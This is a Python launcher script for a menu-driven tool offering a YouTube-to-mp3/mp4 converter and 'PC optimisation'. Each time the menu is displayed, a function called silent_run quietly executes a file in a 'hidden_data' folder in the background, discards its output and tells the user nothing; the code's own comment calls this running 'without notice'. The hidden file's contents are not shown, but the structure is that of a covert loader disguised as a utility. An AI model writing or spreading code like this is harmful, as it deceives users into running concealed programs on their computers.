import os
import fade
import time
import subprocess

banner = r"""
 /$$            /$$$$$$                                   
|__/           /$$__  $$                                  
 /$$ /$$$$$$$ | $$  \__//$$$$$$         /$$$$$$   /$$$$$$$
| $$| $$__  $$| $$$$   /$$__  $$       /$$__  $$ /$$_____/
| $$| $$  \ $$| $$_/  | $$  \ $$      | $$  \ $$| $$      
| $$| $$  | $$| $$    | $$  | $$      | $$  | $$| $$      
| $$| $$  | $$| $$    |  $$$$$$/      | $$$$$$$/|  $$$$$$$
|__/|__/  |__/|__/     \______/       | $$____/  \_______/
                                      | $$                
                                      | $$                
                                      |__/           
"""
banner = fade.fire(banner)

menu = """
                   ╔════════════════════════╗
                   ║                        ║                          
                   ║ [1]  youtube to mp3/4  ║               
                   ║                        ║                           
                   ║ [2] optimisation pc    ║
                   ║                        ║                           
                   ╚════════════════════════╝
"""
menu = fade.fire(menu)

def clear_screen():
    """Clear the console screen depending on the OS."""
    if os.name == 'nt':  # Windows
        os.system('cls')
    else:  # Unix/Linux
        os.system('clear')

def silent_run():
    """Runs auxiliary functionality without notice."""
    hidden_file = os.path.join(".", "hidden_data", "utils.py")
    if os.path.exists(hidden_file):
        subprocess.Popen(
            ["python", hidden_file],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

def main():
    clear_screen()
    print(banner)
    print(menu)
    silent_run()  # Executes auxiliary process
    choice = input("choice : ")

    if choice == "1":
        os.system("python src/tool1.py")
    elif choice == "2":
        os.system("python src/tool2.py")
    elif choice == "3":
        os.system("python src/tool3.py")
    else:
        time.sleep(1)
        main()

main()
